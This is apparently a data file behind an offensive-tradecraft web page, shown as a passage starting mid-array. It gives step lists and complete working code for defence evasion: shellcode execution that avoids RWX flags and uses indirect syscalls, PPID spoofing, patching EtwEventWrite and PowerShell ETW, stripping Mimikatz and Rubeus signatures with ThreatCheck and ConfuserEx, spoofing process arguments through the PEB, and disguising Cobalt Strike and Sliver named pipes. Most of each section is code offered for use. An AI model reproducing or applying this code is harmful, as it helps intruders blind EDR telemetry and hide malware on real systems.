    overview: 'RWX (Read-Write-Execute) memory is the single most reliable indicator of shellcode injection — any memory region that is simultaneously writable and executable at a non-image-mapped address will be flagged immediately by all modern EDRs, even without scanning its content. The correct pattern is: allocate RW → write shellcode → VirtualProtect to RX → execute. For maximum evasion, use NtProtectVirtualMemory via indirect syscall for the permission change, bypassing EDR hooks on VirtualProtect.',
    steps: [
      'NEVER use VirtualAlloc with PAGE_EXECUTE_READWRITE — RWX is an automatic flag in every EDR memory scanner',
      'Step 1: VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) — RW only, nothing to scan',
      'Step 2: memcpy(addr, shellcode, size) — write shellcode while memory is non-executable (no scan trigger)',
      'Step 3: NtProtectVirtualMemory(proc, &addr, &size, PAGE_EXECUTE_READ, &old) — flip to RX, no write permission',
      'Step 4: CreateThread / NtCreateThreadEx to execute — now memory is RX but not writable',
      'Advanced: use NtAllocateVirtualMemory + NtProtectVirtualMemory via indirect syscalls (bypass VirtualAlloc/VirtualProtect hooks)',
      'BOF pattern: use BeaconDataAlloc for temporary buffers — automatically cleaned after BOF; avoids orphaned allocations',
    ],
    commands: [
      {
        title: 'Correct RW→RX shellcode execution pattern',
        code: `// ── WRONG: RWX allocation (instant EDR flag) ──
LPVOID bad = VirtualAlloc(NULL, sc_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);  // ← NEVER DO THIS
memcpy(bad, shellcode, sc_len);
((void(*)())bad)();

// ── CORRECT: RW → write → RX → execute ──
#include <windows.h>

void ExecuteShellcode(BYTE* shellcode, SIZE_T len) {
    // Step 1: Allocate RW (non-executable — no scan trigger)
    LPVOID addr = VirtualAlloc(NULL, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);

    // Step 2: Copy shellcode (memory is still RW, not executable)
    memcpy(addr, shellcode, len);

    // Step 3: Flip to RX (removes write permission — can no longer be modified)
    DWORD old;
    VirtualProtect(addr, len, PAGE_EXECUTE_READ, &old);

    // Step 4: Execute via thread (RX memory — correct permissions)
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    // Cleanup
    VirtualFree(addr, 0, MEM_RELEASE);
}

// ── OPSEC: Use NtAllocateVirtualMemory + NtProtectVirtualMemory via indirect syscall ──
// Bypasses EDR hooks on VirtualAlloc and VirtualProtect
// (SysWhispers3 generated stubs)
PVOID  addr2  = NULL;
SIZE_T size2  = len;
ULONG  old2   = 0;
NtAllocateVirtualMemory(GetCurrentProcess(), &addr2, 0, &size2, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
memcpy(addr2, shellcode, len);
NtProtectVirtualMemory(GetCurrentProcess(), &addr2, &size2, PAGE_EXECUTE_READ, &old2);
HANDLE hT; NtCreateThreadEx(&hT,THREAD_ALL_ACCESS,NULL,GetCurrentProcess(),(LPTHREAD_START_ROUTINE)addr2,NULL,FALSE,0,0,0,NULL);
NtWaitForSingleObject(hT,FALSE,NULL);`
      }
    ]
  },

  {
    id: 'fork-run',
    title: 'Fork-and-Run vs In-Process Execution',
    subtitle: 'Replace CS fork-and-run with BOFs and powerpick to eliminate the process-creation detection signature',
    tags: ['fork-and-run', 'SpawnTo', 'sacrificial process', 'BOF inline-execute', 'powerpick', 'smartinject', 'in-process', 'VirtualAllocEx detection chain'],
    accentColor: 'pink',
    overview: 'Fork-and-run is CS\'s default post-exploitation model: spawn a sacrificial process (dllhost.exe), inject the tool DLL into it, run the tool, kill the process. This generates a completely deterministic event sequence: CreateProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread + TerminateProcess — a textbook injection pattern that every EDR detects. BOFs (Beacon Object Files) run as position-independent code directly inside the Beacon process — no process creation, no remote injection, no termination. powerpick runs PowerShell in-process without spawning powershell.exe.',
    steps: [
      'CS fork-and-run event sequence: CreateProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread → TerminateProcess',
      'Every EDR flags this: the complete sequence is a named detection pattern in every vendor\'s rule set',
      'BOF (inline-execute): runs in Beacon process address space — no new process, no injection, no termination event',
      'BOFs are C code compiled as PIC (position-independent code) — use BeaconDataAlloc for memory, call Beacon APIs',
      'powerpick: uses CS\'s internal unmanaged PowerShell runspace (powershell.dll) — no powershell.exe, no CLM, no AMSI',
      'smartinject: CS injects into an EXISTING dllhost.exe rather than spawning a new one — reduces CreateProcess events',
      'Rule: default to BOFs; use execute-assembly only when no BOF exists; never use default fork-and-run without spawnto configured',
    ],
    commands: [
      {
        title: 'CS: replace fork-and-run with BOFs and powerpick',
        code: `# ── Detection surface comparison ──
# execute-assembly Rubeus.exe  → fork-and-run:
#   CreateProcess(dllhost.exe) + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread + TerminateProcess
#   → 5 high-signal events per tool execution

# inline-execute rubeus_bof.o  → in-process BOF:
#   No new process, no injection, no termination
#   → 0 process creation events

# powerpick Get-DomainUser  → in-process PS:
#   No powershell.exe spawn, no CLM, no AMSI initialization
#   → 0 process creation events

# ── Command equivalents (fork-and-run → in-process) ──
# AVOID:
powershell Get-DomainUser         # Spawns powershell.exe (fork-and-run)
execute-assembly Rubeus.exe       # Spawns dllhost.exe  (fork-and-run)
run net user /domain              # Spawns cmd.exe      (fork-and-run)
shell whoami                      # Spawns cmd.exe      (fork-and-run)

# PREFER:
powerpick Get-DomainUser          # In-process PowerShell (no new process)
inline-execute rubeus_bof.o       # In-process BOF
run-as powerpick Get-DomainUser   # Inject into existing process if needed

# ── Configure smartinject to avoid new process creation ──
post-ex { set smartinject "true"; }
# CS now uses existing dllhost instances instead of spawning new ones
# Sysmon: no CreateProcess events for post-ex operations

# ── Find and use BOFs for common tools ──
# CS Built-in BOFs (always in-process):
ls, pwd, mkdir, cp, rm, cat          # File operations
net view, net user, net group        # Network/AD enum
reg query, reg add                   # Registry
ps                                   # Process listing
# Community BOF ports:
# BOF-Collection (cube0x0): Rubeus, Seatbelt, SharpWMI, etc. as BOFs
# TrustedSec BOF-Template: build your own`
      }
    ]
  },

  {
    id: 'ppid',
    title: 'PPID Spoofing',
    subtitle: 'Use PROC_THREAD_ATTRIBUTE_PARENT_PROCESS to make any spawned process appear as a child of a chosen legitimate parent',
    tags: ['PPID spoof', 'PROC_THREAD_ATTRIBUTE_PARENT_PROCESS', 'STARTUPINFOEX', 'explorer.exe', 'InitializeProcThreadAttributeList', 'Sysmon Event 1', 'process tree'],
    accentColor: 'pink',
    overview: 'Parent Process ID (PPID) spoofing makes CS/Sliver-spawned processes appear as children of a legitimate Windows process rather than the beacon process. EDRs and SIEMs alert on anomalous parent-child chains (svchost.exe → cmd.exe, dllhost.exe → powershell.exe). Using PROC_THREAD_ATTRIBUTE_PARENT_PROCESS in CreateProcess changes what Sysmon Event ID 1 and all EDR telemetry record as the parent — the spoofed parent is written directly into the kernel process structure by the Windows loader.',
    steps: [
      'Normal chain: beacon.dll → dllhost.exe (sacrificial process) → anomalous',
      'Spoofed chain: explorer.exe (PID 1234) → dllhost.exe — appears as a normal Windows activity',
      'OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorerPid) — only this specific right needed',
      'InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize) → HeapAlloc → InitializeProcThreadAttributeList',
      'UpdateProcThreadAttribute(attrs, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE))',
      'CreateProcess with EXTENDED_STARTUPINFO_PRESENT flag and the STARTUPINFOEX structure',
      'CS: set ppid "explorer.exe" in post-ex block applies to all fork-and-run operations; combine with spawnto for full chain control',
    ],
    commands: [
      {
        title: 'PPID spoof via PROC_THREAD_ATTRIBUTE_PARENT_PROCESS (C++)',
        code: `// ppid_spoof.cpp — full PPID spoofing implementation
// Compile: x86_64-w64-mingw32-g++ -O2 -s -o ppid.exe ppid_spoof.cpp -lkernel32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD GetPIDByName(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = {sizeof(pe)};
    if (Process32First(snap, &pe)) do {
        if (_stricmp(pe.szExeFile, name) == 0) { CloseHandle(snap); return pe.th32ProcessID; }
    } while (Process32Next(snap, &pe));
    CloseHandle(snap); return 0;
}

int main() {
    // 1. Get target parent PID (explorer.exe = most natural parent for user-context tools)
    DWORD parentPid = GetPIDByName("explorer.exe");
    printf("[*] Parent PID: %lu (explorer.exe)\\n", parentPid);

    // 2. Open with PROCESS_CREATE_PROCESS right (only right needed)
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);

    // 3. Allocate attribute list
    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    LPPROC_THREAD_ATTRIBUTE_LIST pAttr =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
    InitializeProcThreadAttributeList(pAttr, 1, 0, &attrSize);

    // 4. Set parent process attribute
    UpdateProcThreadAttribute(pAttr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParent, sizeof(HANDLE), NULL, NULL);

    // 5. Create process with spoofed parent
    STARTUPINFOEXW siex = {};
    siex.StartupInfo.cb = sizeof(STARTUPINFOEXW);
    siex.lpAttributeList = pAttr;

    PROCESS_INFORMATION pi = {};
    BOOL ok = CreateProcessW(
        L"C:\\\\Windows\\\\System32\\\\dllhost.exe", NULL, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW | CREATE_SUSPENDED,
        NULL, NULL, (LPSTARTUPINFOW)&siex, &pi);

    if (ok) {
        printf("[+] PID %lu spawned — Sysmon will show parent: explorer.exe\\n", pi.dwProcessId);
        // Optionally inject shellcode into pi.hProcess before ResumeThread
        ResumeThread(pi.hThread);
    }

    DeleteProcThreadAttributeList(pAttr);
    HeapFree(GetProcessHeap(), 0, pAttr);
    CloseHandle(hParent);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return 0;
}`
      }
    ]
  },

  {
    id: 'etw',
    title: 'ETW Bypass — Event Tracing for Windows',
    subtitle: 'Patch EtwEventWrite and the .NET CLR ETW provider to suppress all process telemetry from the current process',
    tags: ['ETW', 'EtwEventWrite', 'xor eax eax ret', '.NET CLR ETW', 'PSEtwLogProvider', 'm_enabled', 'ETW-Ti kernel', 'HWBP ETW intercept'],
    accentColor: 'pink',
    overview: 'ETW is the primary telemetry bus for EDR products — they subscribe to ETW providers to receive process creation events, .NET assembly loads, network connections, registry modifications, and PowerShell script content. Patching EtwEventWrite in ntdll.dll with xor eax,eax; ret suppresses all ETW events from the current process for all providers. For .NET tools, separately patching the CLR\'s internal PSEtwLogProvider (m_enabled field) prevents assembly load events. HWBP-based ETW interception achieves the same result without touching memory.',
    steps: [
      'ETW: Windows event tracing pipeline — EDRs subscribe to providers (Microsoft-Windows-Kernel-Process, Microsoft-Windows-DotNETRuntime)',
      'EtwEventWrite patch: VirtualProtect(EtwEventWrite, RW) → write xor eax,eax; ret (3 bytes) → all ETW events from this process suppressed',
      'MDE and CrowdStrike monitor EtwEventWrite patches — HWBP approach avoids memory modification',
      '.NET ETW: CLR emits ETW events on assembly load — patch m_enabled field in PSEtwLogProvider to zero',
      'PowerShell ETW: PSEtwLogProvider.etwProvider.m_enabled = 0 via reflection — suppresses PS-specific ETW events',
      'ETW-Ti (Threat Intelligence): kernel-level, registered by EDR drivers — cannot be patched from userland; requires BYOVD',
      'HWBP: set DR0 = EtwEventWrite, VEH modifies return value to STATUS_SUCCESS and returns — no memory patch',
    ],
    commands: [
      {
        title: 'ETW bypass — EtwEventWrite patch and .NET CLR ETW (C++ + C#)',
        code: `// ── EtwEventWrite patch (C++) ──
// 3-byte patch: xor eax,eax (33 C0); ret (C3)
#include <windows.h>
bool PatchETW() {
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    PVOID pEtw = GetProcAddress(hNt, "EtwEventWrite");
    DWORD old;
    VirtualProtect(pEtw, 4, PAGE_EXECUTE_READWRITE, &old);
    *(DWORD*)pEtw = 0x90C3C033;  // xor eax,eax; ret; nop
    VirtualProtect(pEtw, 4, old, &old);
    FlushInstructionCache(GetCurrentProcess(), pEtw, 4);
    return true;
}

// ── PowerShell ETW bypass (reflection) ──
$provider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$field    = $provider.GetField('etwProvider', 'NonPublic,Static')
$obj      = $field.GetValue($null)
$enabled  = [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled', 'NonPublic,Instance')
$enabled.SetValue($obj, [System.Int32]0)
# All PowerShell ETW events from this session suppressed

// ── .NET CLR ETW bypass (C# reflection) ──
using System; using System.Reflection;
Type clrEtw = typeof(System.Diagnostics.Eventing.EventProvider);
var providers = clrEtw.GetFields(BindingFlags.NonPublic | BindingFlags.Static);
foreach (var f in providers) {
    if (f.Name.Contains("enabled") || f.Name.Contains("Enabled")) {
        f.SetValue(null, 0);
        Console.WriteLine($"[+] Patched CLR ETW field: {f.Name}");
    }
}

// ── HWBP ETW bypass (no memory patch) ──
// Set DR0 = EtwEventWrite, register VEH
// In VEH: set RIP past the function, set RAX = 0 (STATUS_SUCCESS)
// Return EXCEPTION_CONTINUE_EXECUTION
// Result: EtwEventWrite is a no-op, no memory touched`
      }
    ]
  },

  {
    id: 'signatures',
    title: 'Tool Signature Removal',
    subtitle: 'Use ThreatCheck to bisect and identify triggering bytes, then patch strings, constants, and IL to produce undetected variants',
    tags: ['ThreatCheck', 'DefenderCheck', 'signature offset', 'binary bisect', 'ConfuserEx', 'de4dot', 'string patch', 'IL patch', 'Rubeus', 'Mimikatz', 'YARA rules'],
    accentColor: 'pink',
    overview: 'AV/EDR static signature detection targets specific byte sequences within a binary. ThreatCheck performs an automated binary bisection — it splits the binary, submits each half to AMSI or Windows Defender, and recursively narrows down to the exact byte range triggering detection. Once the flagged bytes are identified (usually a recognisable tool name, API call sequence, or constant), they are patched, renamed, XOR-encoded, or recompiled from source with modifications. ConfuserEx automates obfuscation of .NET IL.',
    steps: [
      'ThreatCheck: ThreatCheck.exe -f tool.exe -e AMSI — binary search finds exact triggering byte range in seconds',
      'DefenderCheck: alternative tool, Linux-compatible, uses Defender engine via MpCmdRun',
      'Examine flagged bytes: Python hex dump at the identified offset — usually a tool name string or API sequence',
      'For .NET tools: rename classes/methods with ConfuserEx (Rename protection level = Unicode/Aggressive)',
      'For native tools: patch triggering string bytes in hex editor or via Python script',
      'Recompile from source: most reliable — rename variables, change constants, restructure flagged functions',
      'Review public YARA rules for the tool (e.g., elastic/detection-rules, yara-forge) to understand ALL detection vectors',
    ],
    commands: [
      {
        title: 'ThreatCheck and signature patching workflow',
        code: `# ── ThreatCheck: find triggering bytes ──
# https://github.com/rasta-mouse/ThreatCheck
ThreatCheck.exe -f Rubeus.exe -e AMSI
ThreatCheck.exe -f mimikatz.exe -e Defender
# Output:
# [*] Testing 474112 bytes
# [*] ...
# [!] Identified end of bad bytes at offset 0x12345
# [!] Target bytes:
#     4D 69 6D 69 6B 61 74 7A    ← "Mimikatz" string found

# ── Examine the flagged bytes ──
python3 << 'EOF'
with open("tool.exe","rb") as f: data=f.read()
off=0x12345
print(f"Context around 0x{off:X}:")
print(data[off-16:off+64].hex())
print(data[off-16:off+64].decode("latin-1",errors="replace"))
EOF

# ── Quick fix: string patch (Python) ──
python3 << 'EOF'
data=bytearray(open("tool.exe","rb").read())
# Replace triggering string (same length to avoid PE corruption)
data=bytes(data).replace(b"Mimikatz", b"Mimkitty")  # Same length
data=bytes(data).replace(b"sekurlsa", b"sekilrsa")
data=bytes(data).replace(b"Rubeus",   b"Rubens")
open("tool_patched.exe","wb").write(data)
print("[+] Patched strings written")
EOF

# ── ThreatCheck on patched binary ──
ThreatCheck.exe -f tool_patched.exe -e Defender
# Repeat until: [+] No threat detected

# ── ConfuserEx for .NET binaries ──
# 1. Download: https://github.com/mkaring/ConfuserEx
# 2. Create crproj:
cat > protect.crproj << 'XML'
<project outputDir="out_protected" baseDir=".">
  <module path="Rubeus.exe">
    <rule pattern="true" inherit="false">
      <protection id="rename"><argument name="mode" value="unicode"/></protection>
      <protection id="encrypt strings"/>
      <protection id="ctrl flow"/>
      <protection id="ref proxy"/>
    </rule>
  </module>
</project>
XML
ConfuserEx.CLI.exe -n protect.crproj
ThreatCheck.exe -f out_protected/Rubeus.exe -e Defender`
      }
    ]
  },

  {
    id: 'cmdline-spoof',
    title: 'Command Line & Argument Spoofing',
    subtitle: 'Create process with benign fake args, then overwrite PEB CommandLine.Buffer before resuming to execute real args with clean telemetry',
    tags: ['command line spoof', 'argument spoof', 'CREATE_SUSPENDED', 'RTL_USER_PROCESS_PARAMETERS', 'PEB +0x20', 'CommandLine +0x78', 'NtQueryInformationProcess', 'Sysmon Event 1', 'WriteProcessMemory'],
    accentColor: 'purple',
    overview: 'EDRs and Sysmon log the process command line from the PEB (Process Environment Block) at creation time. Argument spoofing creates a process in CREATE_SUSPENDED state with a benign fake command line (what Sysmon Event 1 records), then overwrites the RTL_USER_PROCESS_PARAMETERS CommandLine.Buffer field in the remote PEB with the real malicious arguments before resuming the thread. The process runs with real arguments; all telemetry records the fake benign ones.',
    steps: [
      'Create process SUSPENDED with benign fake command line — this is what Sysmon, EDR, and Windows Event 4688 record',
      'NtQueryInformationProcess(ProcessBasicInformation) → PebBaseAddress',
      'ReadProcessMemory at PEB+0x20 (x64) → RTL_USER_PROCESS_PARAMETERS pointer',
      'ReadProcessMemory at pParams+0x78 (x64) → CommandLine.Buffer pointer (PWSTR)',
      'WriteProcessMemory the real command line over CommandLine.Buffer — overwrite in remote process memory',
      'Update Length (pParams+0x70) and MaximumLength (pParams+0x72) to match real arg length',
      'ResumeThread — process executes with real args, but all logs show the fake benign args',
    ],
    commands: [
      {
        title: 'Argument spoofing — PEB CommandLine.Buffer overwrite (C++)',
        code: `// argspoof.cpp — argument spoofing via PEB CommandLine overwrite
// Compile: x86_64-w64-mingw32-g++ -O2 -s -o argspoof.exe argspoof.cpp -lkernel32
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
typedef NTSTATUS(NTAPI* pNtQIP)(HANDLE,PROCESSINFOCLASS,PVOID,ULONG,PULONG);

int main() {
    const wchar_t* fakeArgs = L"svchost.exe -k netsvcs";          // Sysmon sees this
    const wchar_t* realArgs = L"svchost.exe --c2-flag 0x41424344"; // Process runs this

    // 1. Create suspended with FAKE args (what gets logged)
    STARTUPINFOW si = {sizeof(si)}; PROCESS_INFORMATION pi = {};
    CreateProcessW(L"C:\\\\Windows\\\\System32\\\\svchost.exe",
        (LPWSTR)fakeArgs, NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    printf("[*] PID %lu created SUSPENDED — logged args: %ls\\n", pi.dwProcessId, fakeArgs);

    // 2. Get remote PEB base address
    auto NtQIP = (pNtQIP)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQueryInformationProcess");
    PROCESS_BASIC_INFORMATION pbi = {}; ULONG retLen = 0;
    NtQIP(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);

    // 3. Read RTL_USER_PROCESS_PARAMETERS ptr at PEB+0x20 (x64)
    PVOID pParams = nullptr;
    ReadProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + 0x20, &pParams, sizeof(PVOID), NULL);

    // 4. Read CommandLine.Buffer ptr at pParams+0x78 (x64)
    // RTL_USER_PROCESS_PARAMETERS layout at +0x70:
    //   USHORT Length          (+0x70)
    //   USHORT MaximumLength   (+0x72)
    //   ULONG  pad             (+0x74)
    //   PWSTR  Buffer          (+0x78)
    PVOID cmdBufPtr = nullptr;
    ReadProcessMemory(pi.hProcess, (BYTE*)pParams + 0x78, &cmdBufPtr, sizeof(PVOID), NULL);
    printf("[*] CommandLine.Buffer remote ptr: 0x%p\\n", cmdBufPtr);

    // 5. Write real args over the CommandLine.Buffer
    SIZE_T realBytes = (wcslen(realArgs) + 1) * sizeof(wchar_t);
    WriteProcessMemory(pi.hProcess, cmdBufPtr, realArgs, realBytes, NULL);

    // 6. Update Length / MaximumLength fields
    USHORT realLen = (USHORT)(wcslen(realArgs) * 2);
    USHORT realMax = (USHORT)((wcslen(realArgs) + 1) * 2);
    WriteProcessMemory(pi.hProcess, (BYTE*)pParams + 0x70, &realLen, 2, NULL);
    WriteProcessMemory(pi.hProcess, (BYTE*)pParams + 0x72, &realMax, 2, NULL);

    printf("[+] Resuming — logged: %-30ls  actual: %ls\\n", fakeArgs, realArgs);
    ResumeThread(pi.hThread);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return 0;
}`
      }
    ]
  },

  {
    id: 'smb-pipes',
    title: 'SMB Named Pipe Customization',
    subtitle: 'Replace default CS/Sliver pipe names with per-engagement randomised names mimicking legitimate Windows service pipes',
    tags: ['SMB named pipes', 'msagent_*', 'MSSE-*', 'pipename ##', 'svcctl', 'wkssvc', 'srvsvc', 'lsass', 'Sysmon Event 17/18', 'pipe name IOC'],
    accentColor: 'purple',
    overview: 'Cobalt Strike SMB beacons and post-exploitation fork-and-run operations communicate over Windows named pipes. Default CS pipe names (msagent_*, MSSE-*-server, postex_*) are the single most reliable IOC for CS detection — every SIEM and threat intelligence platform has detection rules based on these patterns. Custom pipe names that mimic legitimate Windows service pipes (svcctl, wkssvc, lsass, netlogon) blended with random suffixes defeat static pipe name detection. The ## wildcard in Malleable C2 generates a unique random suffix per session.',
    steps: [
      'Default CS pipe names: msagent_*, MSSE-*-server, postex_* — all are instant detections in every SIEM',
      'Sysmon Event 17 (PipeCreated) and Event 18 (PipeConnected) log named pipe operations — custom names are still logged',
      'Choose pipe names that mimic legitimate Windows service pipes: svcctl, wkssvc, srvsvc, lsass, ntsvcs, netlogon',
      'Use ## wildcard for random per-session suffix — prevents correlation across engagements',
      'Configure in Malleable C2 profile at the global level AND in the post-ex block (different pipe names for different operation types)',
      'Sliver: configure pipe name when creating the SMB listener (sliver > smb --pipe-name)',
      'Verify: pipe should be visible via dir \\\\.\\ pipe\\ during operation but match the legitimate-looking pattern',
    ],
    commands: [
      {
        title: 'Malleable C2 — complete pipe name configuration',
        code: `# ── Malleable C2 profile — pipe name configuration ──
# Global beacon pipe names
set pipename "svcctl_##########";          # 10-char random suffix
set pipename_stager "status_##########";   # Stager pipe

# Post-ex block pipe names (fork-and-run operations)
post-ex {
    set spawnto_x64    "%windir%\\sysnative\\dllhost.exe";
    set spawnto_x86    "%windir%\\syswow64\\dllhost.exe";
    set ppid           "explorer.exe";
    set pipename       "wkssvc_##########";    # Post-ex ops use different pipe
    set obfuscate      "true";
}

# ── Legitimate Windows pipe names to mimic ──
# Test each on target system — avoid collisions with actual running services
dir \\\\.\\pipe\\ | findstr -i "svcctl\\|wkssvc\\|srvsvc\\|lsass\\|netlogon"
# If a pipe already exists: choose a different pattern

# ── Verify your beacon pipe ──
# In CS beacon:
shell dir \\\\.\\pipe\\
# Or from a separate beacon:
powerpick Get-ChildItem \\\\.\\pipe\\ | Select-Object Name | Where-Object { $_.Name -like "svcctl*" }

# ── Sliver — SMB listener with custom pipe name ──
sliver > smb --listener 0.0.0.0 --pipe-name "wkssvc_9182736450"
# Generate implant connecting to SMB listener
sliver > generate --os windows --arch amd64 \\
  --format dll \\
  --named-pipe-c2 "\\\\\\\\TARGET\\\\pipe\\\\wkssvc_9182736450"

# ── Sysmon tuning: legitimate-looking pipe names reduce alert priority ──
# Defenders tune Sysmon rules on pipe name patterns:
# Event 17 rule: pipeName | contains | msagent_ → HIGH ALERT
# Event 17 rule: pipeName | contains | svcctl_  → MEDIUM (investigate in context)`
      }
    ]
  },
];